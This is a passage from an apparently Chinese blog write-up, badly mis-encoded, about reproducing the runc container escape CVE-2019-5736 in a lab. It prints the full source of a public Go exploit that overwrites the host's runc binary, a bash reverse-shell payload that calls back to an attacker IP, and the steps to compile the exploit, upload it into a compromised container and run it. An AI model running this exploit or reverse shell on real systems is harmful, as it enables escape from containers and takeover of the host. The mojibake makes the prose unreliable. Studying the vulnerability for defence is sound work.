version</code>æ˜¾ç¤ºä¸ºä¸€ä¸²å­—ç¬¦åºåˆ—æ—¶ï¼Œè¿™å®é™…ä¸Šæ˜¯<code>runc</code>çš„Git commit hashæˆ–è€…æ„å»ºæ ‡ç­¾ï¼ˆbuild tagï¼‰ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.53.09.png" style="zoom:50%;"><p>2ï¼‰ç›´æ¥è¿è¡Œdocker-runc â€“version</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.58.17.png" style="zoom:50%;"></blockquote><p>dockerå’Œruncçš„ç‰ˆæœ¬ç¬¦åˆæ¼æ´åˆ©ç”¨çš„æ¡ä»¶ï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸ç¬¦åˆæ¼æ´åˆ©ç”¨çš„æ¡ä»¶ã€‚</p><h2 id="2-2-æ”»å‡»è„šæœ¬ç¼–è¯‘"><a href="#2-2-æ”»å‡»è„šæœ¬ç¼–è¯‘" class="headerlink" title="2.2 æ”»å‡»è„šæœ¬ç¼–è¯‘"></a>2.2 æ”»å‡»è„šæœ¬ç¼–è¯‘</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go">git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Frichetten<span class="token operator">/</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">5736</span><span class="token operator">-</span>PoC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.27.52.png" style="zoom:50%;"><p>å°†è„šæœ¬ä¸­è¦åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œçš„payloadä¿®æ”¹ä¸ºåå¼¹shellçš„å‘½ä»¤ï¼ŒIPä¸ºæ”»å‡»æœºIPï¼Œç«¯å£ä¸ºæ”»å‡»æœºç›‘å¬çš„ç«¯å£ï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token comment">// Implementation of CVE-2019-5736</span><span class="token comment">// Created with help from @singe, @_cablethief, and @feexd.</span><span class="token comment">// This commit also helped a ton to understand the vuln</span><span class="token comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"io/ioutil"</span><span class="token string">"os"</span><span class="token string">"strconv"</span><span class="token string">"strings"</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token keyword">var</span> shellCmd <span class="token builtin">string</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellCmd<span class="token punctuation">,</span> <span class="token string">"shell"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"Execute arbitrary commands"</span><span class="token punctuation">)</span>flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// This is the line of shell commands that will execute on the host</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"#!/bin/bash \n"</span> <span class="token operator">+</span> shellCmd<span class="token comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>fd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"#!/proc/self/exe"</span><span class="token punctuation">)</span>err <span class="token operator">=</span> fd<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Overwritten /bin/sh successfully"</span><span class="token punctuation">)</span><span class="token comment">// Loop through all processes to find one whose cmdline includes runcinit</span><span class="token comment">// This will be the process created by runc</span><span class="token keyword">var</span> found <span class="token builtin">int</span><span class="token keyword">for</span> found <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>pids<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadDir</span><span class="token punctuation">(</span><span class="token string">"/proc"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> f <span class="token operator">:=</span> <span class="token keyword">range</span> pids <span class="token punctuation">{</span>fbytes<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span> <span class="token operator">+</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/cmdline"</span><span class="token punctuation">)</span>fstring <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>fbytes<span class="token punctuation">)</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>fstring<span class="token punctuation">,</span> <span class="token string">"runc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Found the PID:"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>found<span class="token punctuation">,</span> err <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// We will use the pid to get a file handle for runc on the host.</span><span class="token keyword">var</span> handleFd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">for</span> handleFd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{</span><span class="token comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>handle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/exe"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>handleFd <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got the file handle"</span><span class="token punctuation">)</span><span class="token comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span><span class="token comment">// It will maintain it's executable flag</span><span class="token keyword">for</span> <span class="token punctuation">{</span>writeHandle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/self/fd/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>handleFd<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_WRONLY<span class="token operator">|</span>os<span class="token punctuation">.</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">int</span><span class="token punctuation">(</span>writeHandle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got write handle"</span><span class="token punctuation">,</span> writeHandle<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] The command executed is"</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>writeHandle<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.43.26/3333 0&gt;&amp;1 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.25.12.png" style="zoom:40%;"><p>âš ï¸ï¼šè¿™ä¸ªåœ°æ–¹è¿™æ ·æ”¹çš„è¯å°±æ”¹é”™ä½ç½®äº†ï¼Œåº”è¯¥æ”¹çš„æ˜¯payloadå‚æ•°ï¼Œè¿™é‡Œ<code>var shellCmd string</code>æ˜¯ä¸ªå˜é‡ç±»å‹çš„å£°æ˜ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.43.44.png" style="zoom:40%;"><p>åº”è¯¥æ”¹çš„æ˜¯payloadçš„å€¼ã€‚æ‰§è¡Œå‘½ä»¤ç¼–è¯‘ç”Ÿæˆpayloadã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š"><a href="#å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š" class="headerlink" title="å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š"></a>å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š</h4><p>æ‰§è¡Œç¼–è¯‘å‘½ä»¤æŠ¥é”™ï¼Œå¾ˆæ˜¾ç„¶kaliä¸Šæ²¡æœ‰goç¯å¢ƒç”¨æ¥ç¼–è¯‘goè„šæœ¬ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.35.58.png" style="zoom:30%;"><p>å®‰è£…gccgo-goã€golang-goæ—¶æŠ¥é”™</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.37.17.png" alt="æˆªå±2025-01-03 14.37.17" style="zoom:40%;"><p>ç›®æµ‹æ˜¯kaliè½¯ä»¶æºçš„é—®é¢˜ã€‚</p><p>æ›´æ–°kaliè½¯ä»¶åŒ…ï¼Œå‘ç°è½¯ä»¶æºæŠ¥é”™ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.35.37.png" style="zoom:50%;"><p>åº”è¯¥æ˜¯å¾ˆä¹…æ²¡æœ‰åœ¨kaliè£…è½¯ä»¶äº†ï¼Œæºéƒ½è¿‡æœŸäº†ã€‚</p><p>å¯ä»¥ç›´æ¥æ‰“å¼€è¿™ä¸ªç›®å½• /etc/apt/ å¹¶æ‰¾åˆ° sources.list æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…ˆç”¨ # æŠŠåŸæœ¬çš„æ³¨é‡Šæ‰ï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.40.52.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.41.30.png" style="zoom:30%;"><p>ä¹‹åï¼Œåœ¨ä¸‹é¢æ·»åŠ ä¸Šæ–°çš„æºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># aliyun é˜¿é‡Œäº‘</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib <span class="token comment"># ustc ä¸­ç§‘å¤§</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="token comment">#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><span class="token comment">#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free&lt;br&gt;&lt;br&gt;# æ¸…åå¤§å­¦&lt;br&gt;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&lt;br&gt;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span> <span class="token comment"># kali å®˜æ–¹æº</span>deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib <span class="token comment"># é»˜è®¤çš„ç›´æ¥æ³¨é‡Šæ‰</span><span class="token comment">#deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span class="token comment">#deb-src http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.27.04.png" style="zoom:40%;"><p>kaliå®˜æ–¹æºå¯ä»¥æ³¨é‡Šæ‰ï¼Œç„¶åæ›´æ–°æ›´æ–°æºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.44.48.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Err:1 http://mirrors.aliyun.com/kali kali-rolling InRelease                                              The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <span class="token operator">&lt;</span>devel@kali.org<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è§£å†³æ–¹æ³•ï¼š ä¸‹è½½æœ€æ–°keyæ·»åŠ åˆ°keylist</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-O</span> - https://archive.kali.org/archive-key.asc <span class="token operator">|</span> apt-key <span class="token function">add</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.47.11.png" style="zoom:50%;"><p>è®¿é—®ä¸äº†ï¼Œä¼°è®¡åˆè¢«å¢™äº†ã€‚</p><blockquote><p><code>wget</code> æ˜¯ä¸€ä¸ªåœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨çš„æ–‡ä»¶ä¸‹è½½å·¥å…·ï¼Œç”¨äºä»ç½‘ç»œä¸Šä¸‹è½½æ–‡ä»¶ã€‚<code>wget</code> å‘½ä»¤çš„å‚æ•°å¯ä»¥æ§åˆ¶å…¶è¡Œä¸ºå’Œè¾“å‡ºã€‚ä¸‹é¢æ˜¯æ‚¨æåˆ°çš„å‚æ•°çš„è§£é‡Šï¼š</p><ol><li><code>-q</code>ï¼šè¿™ä¸ªé€‰é¡¹è®© <code>wget</code> ä»¥é™é»˜æ¨¡å¼è¿è¡Œï¼Œå³ä¸åœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¿¡æ¯ã€‚è¿™åŒ…æ‹¬ä¸‹è½½è¿›åº¦ã€é”™è¯¯æ¶ˆæ¯ç­‰ã€‚é™é»˜æ¨¡å¼é€šå¸¸ç”¨äºè„šæœ¬ä¸­ï¼Œä»¥é¿å…è¾“å‡ºä¸å¿…è¦çš„ä¿¡æ¯ã€‚</li><li><code>-O</code>ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ã€‚å¦‚æœä¸è·Ÿæ–‡ä»¶åï¼Œ<code>wget</code> ä¼šå°†ä¸‹è½½çš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè¿™é€šå¸¸ä¸ç®¡é“ï¼ˆ<code>|</code>ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œå°†è¾“å‡ºä¼ é€’ç»™å…¶ä»–å‘½ä»¤æˆ–ç¨‹åºã€‚</li><li><code>-</code>ï¼šå½“ <code>-O</code> åé¢ç´§è·Ÿä¸€ä¸ª <code>-</code> æ—¶ï¼Œå®ƒå‘Šè¯‰ <code>wget</code> å°†ä¸‹è½½çš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œè€Œä¸æ˜¯ä¿å­˜åˆ°æ–‡ä»¶ã€‚è¿™ä¸ <code>-O -</code> ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥å®ç°å°†ä¸‹è½½çš„å†…å®¹ç›´æ¥ä¼ é€’ç»™å…¶ä»–å‘½ä»¤æˆ–ç¨‹åºï¼Œè€Œä¸æ˜¯ä¿å­˜åˆ°ç£ç›˜ã€‚</li></ol></blockquote><p>åœ¨ç‰©ç†æœºä¸Šä¸‹è½½ä¸‹æ¥å…ˆï¼Œç„¶åæ”¾åœ¨è™šæ‹Ÿæœºä¸­ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.51.34.png" style="zoom:50%;"><p>ç„¶åcatæŸ¥çœ‹ï¼Œé€šè¿‡ç®¡é“ç¬¦äº¤ç»™apt-key addæ·»åŠ ã€‚</p><p>ç„¶åå†æ¬¡è¿è¡Œ<code>apt-get update</code>ï¼Œæºèƒ½å¤Ÿæ›´æ–°æˆåŠŸã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.57.57.png" style="zoom:50%;"></blockquote><p>å®‰è£…goç¼–è¯‘å·¥å…·ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> golang<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š-1"><a href="#å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š-1" class="headerlink" title="å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š"></a>å¤§æˆ˜bug-ã€Œå®‰è£…goç¯å¢ƒã€ï¼š</h3><p>ç›´æ¥æŠŠç³»ç»Ÿæå´©äº†å¯è¿˜è¡Œã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.15.40.png" style="zoom:50%;"><p>åªèƒ½å¼ºè¡Œå…³æœºã€‚å…³æœºæŒ‰é’®éƒ½æ²¡äº†ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.18.15.png" style="zoom:50%;"><p>é‡å¯ä¹‹åã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.21.18.png" style="zoom:50%;"><p>goå®‰è£…æˆåŠŸã€‚</p></blockquote><p>ç»§ç»­ç¼–è¯‘ï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.24.40.png" style="zoom:40%;"><p>ç¼–è¯‘æˆåŠŸã€‚</p><h2 id="2-3-ä¸Šä¼ åˆ°å®¹å™¨ä¸­"><a href="#2-3-ä¸Šä¼ åˆ°å®¹å™¨ä¸­" class="headerlink" title="2.3 ä¸Šä¼ åˆ°å®¹å™¨ä¸­"></a>2.3 ä¸Šä¼ åˆ°å®¹å™¨ä¸­</h2><p>ç›®æ ‡æœåŠ¡å™¨ä¸­è¿è¡Œçš„å®¹å™¨ï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.27.14.png" style="zoom:50%;"><p>å‡è®¾å·²ç»æ‹¿ä¸‹å®¹å™¨çš„shellã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.28.09.png" style="zoom:50%;"><p>ä¸Šä¼ æ–‡ä»¶åˆ°tmpç›®å½•ä¸­ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2016.55.27.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2016.56.14.png" style="zoom:50%;"><h2 id="2-4-ä¿®æ”¹æƒé™å¹¶æ‰§è¡Œ"><a href="#2-4-ä¿®æ”¹æƒé™å¹¶æ‰§è¡Œ" class="headerlink" title="2.4 ä¿®æ”¹æƒé™å¹¶æ‰§è¡Œ"></a>2.4 ä¿®æ”¹æƒé™å¹¶æ‰§è¡Œ</h2><h3 id="2-4-1-èšå‰‘è™šæ‹Ÿç»ˆç«¯å°è¯•æ‰§è¡Œï¼ˆå¤±è´¥ï¼‰"><a href="#2-4-1-èšå‰‘è™šæ‹Ÿç»ˆç«¯å°è¯•æ‰§è¡Œï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="2.4.1 èšå‰‘è™šæ‹Ÿç»ˆç«¯å°è¯•æ‰§è¡Œï¼ˆå¤±è´¥ï¼‰"></a>2.4.1 èšå‰‘è™šæ‹Ÿç»ˆç«¯å°è¯•æ‰§è¡Œï¼ˆå¤±è´¥ï¼‰</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.00.41.png" style="zoom:70%;"><p>æ‰§è¡Œmainæ–‡ä»¶æƒé™ä¸å¤Ÿã€‚</p><h3 id="2-4-2-å…ˆè·å–åå¼¹çš„root-shell"><a href="#2-4-2-å…ˆè·å–åå¼¹çš„root-shell" class="headerlink" title="2.4.2 å…ˆè·å–åå¼¹çš„root shell"></a>2.4.2 å…ˆè·å–åå¼¹çš„root shell</h3><blockquote><p>å…·ä½“å¦‚ä½•è·å–çš„rootæƒé™çš„å®¹å™¨shellï¼Œå¯ä»¥çœ‹æœ¬ç«™ ã€Šä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ ã€‹è¿™ç¯‡æ–‡ç« ã€‚</p></blockquote><p>å…ˆææƒè·å–rootæƒé™çš„å®¹å™¨shellï¼Œç„¶åä¿®æ”¹mainå‡½æ•°çš„æƒé™ä¹‹åæ‰§è¡Œï¼Œæç¤ºOverwrittenæˆåŠŸã€‚</p><p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.09.19.png" alt="æˆªå±2025-01-03 17.09.19"></p><p>å·¦è¾¹ncç›‘å¬åå¼¹çš„ç›®æ ‡ä¸»æœºçš„shellï¼Œå³è¾¹æ˜¯è·å–çš„å®¹å™¨ä¸­çš„rootæƒé™çš„shellã€‚</p><p>å¦‚æœå·¦è¾¹èƒ½å¤Ÿè·å–åˆ°shellï¼Œé‚£ä¹ˆå°±æˆåŠŸä»å®¹å™¨ä¸­å®ç°äº†é€ƒé€¸ã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.13.33.png" alt="æ‰‹åŠ¨é‡å¯å®¹å™¨" style="zoom:50%;"><p>æ‰‹åŠ¨é‡å¯å®¹å™¨ï¼Œå¹¶æ²¡æœ‰è·å¾—é€ƒé€¸æˆåŠŸçš„shellã€‚</p><blockquote><h3 id="å¤§æˆ˜bug-ã€Œå®¹å™¨å¯åŠ¨ç§’é€€ã€ï¼š"><a href="#å¤§æˆ˜bug-ã€Œå®¹å™¨å¯åŠ¨ç§’é€€ã€ï¼š" class="headerlink" title="å¤§æˆ˜bug-ã€Œå®¹å™¨å¯åŠ¨ç§’é€€ã€ï¼š"></a>å¤§æˆ˜bug-ã€Œå®¹å™¨å¯åŠ¨ç§’é€€ã€ï¼š</h3><p>ä¹‹å‰æ‰‹åŠ¨å…³é—­é‡å¯å®¹å™¨ï¼Œè¿™æ¬¡æ‰§è¡Œsudo docker start 